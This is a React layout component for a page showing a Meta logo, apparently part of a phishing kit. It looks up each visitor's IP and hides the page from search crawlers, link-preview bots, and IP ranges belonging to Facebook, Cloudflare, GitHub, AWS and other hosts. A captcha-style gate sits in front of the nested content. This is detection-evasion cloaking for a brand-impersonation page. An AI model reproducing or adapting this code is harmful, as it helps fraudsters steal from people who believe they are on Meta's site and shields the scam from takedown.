import { useEffect, useState } from "react";
import MetaLogo from "@/assets/images/meta-image.png";
import { Outlet } from "react-router";
import CloudflareCaptcha from "@/components/cloudflare-captcha";

const getIp = async (): Promise<string | null> => {
  try {
    const response = await fetch("https://get.geojs.io/v1/ip.json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
};

const isBot = () => {
  const userAgent = navigator.userAgent.toLowerCase();
  const botPatterns = [
    "googlebot",
    "bingbot",
    "yandexbot",
    "duckduckbot",
    "slurp",
    "baiduspider",
    "facebookexternalhit",
    "twitterbot",
    "rogerbot",
    "linkedinbot",
    "embedly",
    "quora link preview",
    "showyoubot",
    "outbrain",
    "pinterest",
    "slackbot",
    "vkShare",
    "w3c_validator",
    "render",
  ];
  return botPatterns.some((pattern) => userAgent.includes(pattern));
};

const isBlockedIP = async (ip: string): Promise<boolean> => {
  const blockedOrganizations = [
    "facebook",
    "netlify",
    "cloudflare",
    "vercel",
    "github",
    "gitlab",
    "bitbucket",
    "heroku",
    "aws",
    "azure",
    "digitalocean",
    "lighttpd",
    "applebot",
    "googlebot",
    "bingbot",
    "yandexbot",
    "baidu",
    "duckduckbot",
    "pinterest",
    "linkedin",
    "twitter",
    "render",
  ];

  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`);
    const data = await response.json();
    if (data.organization) {
      return blockedOrganizations.some((org) =>
        data.organization.toLowerCase().includes(org),
      );
    }
  } catch (error) {
    console.error("Error checking IP:", error);
  }
  return false;
};

const checkAccess = async () => {
  if (isBot()) return false;
  const ip = await getIp();
  if (ip && (await isBlockedIP(ip))) return false;
  return true;
};

const Layout = () => {
  const [hasAccess, setHasAccess] = useState<boolean | null>(null);
  const [showCaptcha, setShowCaptcha] = useState(true);

  useEffect(() => {
    const verifyAccess = async () => {
      const result = await checkAccess();
      setHasAccess(result);
    };
    verifyAccess();
  }, []);

  const handleCaptchaVerified = () => {
    setShowCaptcha(false);
  };

  if (hasAccess === null) return null;

  if (showCaptcha) {
    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
  }

  if (!hasAccess) {
    return <div className="p-8 text-center">access denied.</div>;
  }

  return (
    <>
      <div className="sticky top-0 right-0 left-0 h-12 bg-gray-200 px-4 py-1 shadow-sm">
        <img src={MetaLogo} alt="Meta logo" className="h-full" />
      </div>
      <div className="flex min-h-[calc(100vh-3rem)] items-center justify-center bg-gradient-to-br from-[#FCF3F8] to-[#F0FAF4] px-4 md:px-0">
        <Outlet />
      </div>
    </>
  );
};

export default Layout;
